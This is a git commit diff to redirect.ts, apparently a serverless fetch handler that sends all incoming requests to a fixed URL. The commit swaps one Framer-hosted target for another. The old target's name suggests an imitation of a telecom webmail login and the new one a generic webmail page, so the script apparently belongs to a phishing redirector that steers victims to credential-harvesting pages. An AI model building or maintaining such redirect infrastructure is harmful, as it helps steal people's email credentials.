760a351325c924dfcdcf133066303cd7c20ae357
Gram77 <wonderland070@outlook.com>
2025-10-09 22:43:36 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://telstrawembamilshtml.framer.website/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://mywebmailsrtmamma.framer.website/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
